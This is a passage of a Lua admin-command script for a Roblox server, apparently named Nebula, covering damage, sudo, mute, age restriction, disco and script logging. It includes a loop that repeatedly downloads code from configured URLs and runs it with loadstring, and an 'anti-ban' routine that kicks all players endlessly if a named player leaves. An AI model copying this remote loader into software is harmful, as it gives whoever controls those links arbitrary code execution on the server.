    notificationTablet(v,plr.Name .. ' has healed you.',Color3.new(0,1,0),nil,nil,5)
  end
end)
newCmd("damage","dmg","Damages the player",1,{"Player Name", "Damage"}, {}, false, function(plr,args)
  local targets=findPlayer(args[1],plr)
  for i,v in pairs(targets) do
    if checkCommand(v,plr,'damage') then
      pcall(function() v.Character.Humanoid:TakeDamage(tonumber(args[2])) end)
      newTablet(plr,'Took ' .. args[2] .. ' of ' .. v.Name .. "'s health.",Color3.new(0,1,0))
    end
  end
end)
newCmd("sudo","sdo","Preforms the command on the player specified",2,{"Player Name", "Command", "Args"}, {}, false, function(plr,args)
  local target = findPlayer(args[1],plr)
  local args4 = {}
  for i,v in pairs(args) do
    if type(i)=='number' then
      if i>=4 then table.insert(args4,v) end
    end
  end
  for i,v in pairs(target) do
    if checkCommand(v,plr,'sudo') then
      if #args>3 then
        cmds(v,args[2]..";"..args[3]..table.concat(args4,','))
      elseif #args>2 then
        cmds(v,args[2]..";"..args[3])
      elseif #args>1 then
        cmds(v,args[2]..";")
      end
    end
  end
end)
newCmd("accountage","age","Shows you the player's account age",1,{"Player Name"}, {"-f (format)"}, true, function(plr,args,tags)
  local target = findPlayer(args[1],plr)
  for i,v in pairs(target) do
    if not tags[1] or tags[1]~='f' then
      newTablet(plr,v.Name .. "'s account age: " .. tostring(v.AccountAge))
    elseif tags[1]=='f' then
      if #target>1 then
        newTablet(plr,v.Name,Color3.new(0,0,1),"age;"..v.Name..",-f")
      else
        local years
        local months
        local days
        years = math.floor(v.AccountAge/365)
        months = math.floor((v.AccountAge/30) - (years * 12))
        days = (v.AccountAge - ( months*30 + years*365 ) )
        newTablet(plr,v.Name)
        newTablet(plr,years .. " Years")
        newTablet(plr,months .. " Months")
        newTablet(plr,days .. " Days")
      end
    end
  end
end)
newCmd("agerestriction","ar", "Age restriction manager", 2, {"Minimum age (requires -set tag)"}, {"-on", "-off", "-set"}, true, function(plr,args,tags)
  if not tags[1] then
    ageRestriction.Enabled = not (ageRestriction.Enabled)
    if not ageRestriction.Enabled then
      newTablet(plr, "Age restriction toggled", Color3.new(1,0,0))
    else
      newTablet(plr, "Age restriction toggled",Color3.new(0,1,0))
      for i,v in pairs(services.players:GetPlayers()) do
        checkAge(v)
      end
    end
  else
    if tags[1]=='on' then
      for i,v in pairs(services.players:GetPlayers()) do
        checkAge(v)
      end
      ageRestriction.Enabled=true
      newTablet(plr,'Age restriction turned on',Color3.new(0,1,0))
    elseif tags[1]=='off' then
      ageRestriction.Enabled=false
      newTablet(plr,'Age restriction turned off',Color3.new(1,0,0))
    elseif tags[1]=='set' then
      ageRestriction.MinAge=tonumber(args[1])
      if ageRestriction.Enabled==true then
        for i,v in pairs(services.players:GetPlayers()) do
          checkAge(v)
        end
      end
      newTablet(plr, 'Age restriction set')
    end
  end
end)
newCmd("mute","mt","Mutes a player", 2, {"Player Name"}, {"-u (unmute)"}, true, function(plr,args,tags)
	local target = findPlayer(args[1])
	for i,v in pairs(target) do
		if not tags[1] then
			if checkCommand(v,plr,'mute') then
				if not v.Character then v:LoadCharacter() end
				_ns(v.Character,true,[[game:GetService("StarterGui"):SetCoreGuiEnabled('All',false)]])
				newTablet(plr,'Muted ' .. v.Name ..'.',Color3.new(1,0,0))
			end
		elseif tags[1]=='u' then
			if not v.Character then v:LoadCharacter() end
			_ns(v.Character,true,[[game:GetService("StarterGui"):SetCoreGuiEnabled('All',true)]])
			newTablet(plr,'Unmuted ' .. v.Name ..'.',Color3.new(0,1,0))
		end
	end
end)
newCmd("disco","dsc","Toggles disco",1,{},{"-on","-off"},true,function(plr,__,tags)
	if not tags[1] then
		if disco==true then
			disco=false
			newTablet(plr,"Toggled disco.",Color3.new(1,0,0))
		else
			disco=true
			newTablet(plr,"Toggled disco.",Color3.new(0,1,0))
		end
	elseif tags[1]=='on' then
		disco=true
		newTablet(plr,"Turned disco on.",Color3.new(0,1,0))
	elseif tags[1]=='off' then
		disco=false
		newTablet(plr,'Turned disco off.',Color3.new(1,0,0))
	end
end)
-- COMMANDS END --

-- Scripting Compatability --
scriptingCompatability.eventConnection = game.DescendantAdded:connect(function(instance)
  pcall(function()
    if instance:IsA("BaseScript") then
      if getSource(instance) then
        if instance.ClassName=="Script" and not scriptingCompatability.script then
          scriptingCompatability.script=instance:Clone()
          scriptingCompatability.script.Disabled=true
          editSource('',scriptingCompatability.script)
          broadcast("Scripting Compatability: Script found.",Color3.new(0,1,0),nil,nil,2)
        end
        if instance.ClassName=="LocalScript" and not scriptingCompatability.localscript then
          scriptingCompatability.localscript=instance:Clone()
          scriptingCompatability.localscript.Disabled=true
          editSource('',scriptingCompatability.localscript)
          broadcast("Scripting Compatability: LocalScript found.",Color3.new(0,1,0),nil,nil,2)
          for i,v in pairs(nebulaClientQuee) do
            if not v.PlayerGui then Instance.new("PlayerGui",v) end
            _ns(v.PlayerGui,true,clientSource)
          end
        end
        if scriptingCompatability.script and scriptingCompatability.localscript then scriptingCompatability.eventConnection:disconnect() scriptingCompatability.eventConnection=nil end
      end
    else return end
  end)
end)

-- Disco --
coroutine.wrap(function()
	local base
	while wait() do
		if disco==true then
			if not base or base.Parent~=Workspace then
				if Workspace:FindFirstChild("Base") then base=Workspace.Base
				elseif Workspace:findFirstChild("Baseplate") then base=Workspace.Baseplate
				elseif Workspace:findFirstChild("BasePlate") then base=Workspace.BasePlate
				else print('Base not found.') wait(1) end
			end
			if base then
				game:GetService("Lighting").TimeOfDay=24
				game:GetService("Lighting").FogStart=100
				game:GetService("Lighting").FogEnd=100
				game:GetService("Lighting").FogColor=BrickColor.Random().Color
				base.BrickColor=BrickColor.Random()
			end
		else wait(1) end
	end
end)()

-- Anti-ban Support --
coroutine.wrap(function()
  while wait(2.5) do
    for i,v in pairs(antiban) do
      if v==true then
        if not game:GetService("Players"):findFirstChild(i) then
          abortShudown=false -- Just incase it was set to true
          local msg=Instance.new("Message",Workspace)
          local found
          for cd = 30,0,-1 do
            if not msg then msg = Instance.new("Message",Workspace) end
            if abortShutdown then table.remove(antiban,i) msg.Text="Nebula Antiban\nShutdown aborted." wait(3) abortShutdown=false found=true break end
            if game:GetService("Players"):findFirstChild(i) then msg.Text="Nebula Antiban\nShutdown aborted (player joined)." wait(3) found=true break end
            msg.Text="Nebula Antiban\nIf " .. i .. " doesn't rejoin in " .. cd .. " second(s), then the server will shutdown."
            wait(1)
          end
          if not found then
            while wait() do
              for i,v in pairs(game:GetService("Players"):GetChildren()) do
                v:Kick()
              end
            end
          end
          msg:Destroy()
        end
      end
    end
  end
end)()

-- Script Log & Script Lock --
scriptlogconnection = Game.DescendantAdded:connect(function(desc)
  pcall(function()
    if desc:IsA("BaseScript") then
      if scriptsenabled == false then
        coroutine.wrap(function()
          pcall(function()
            repeat
              desc.Disabled=true
              desc.Name="NebularRemovedScript"
              desc:ClearAllChildren()
              desc.Parent=nil
              wait()
            until desc.Disabled==true and desc.Parent==nil
            desc:Remove()
          end)
        end)()
      end
      table.insert(scriptlog, desc)
      print(desc.Name.." Script has been inserted to script log")
    end
  end)
end)

coroutine.wrap(function()
  repeat
    wait(0.5) -- 2 requests/sec, 8 1/3 requests/sec max.
    if remoteSettings.update then
      for i,v in pairs(remoteSettings.links) do
        local scr = game:GetService("HttpService"):GetAsync(v,true)
        local load = loadstring(scr)
        coroutine.wrap(function()
          pcall(function() load() end)
        end)()
     end
    end
  until false
end)()

end) -- ends ypcall
if scriptGlobalResult then
  print("The script has ran succesfully with no known errors.")
else
  print("error occured: ".. scriptGlobalError)
end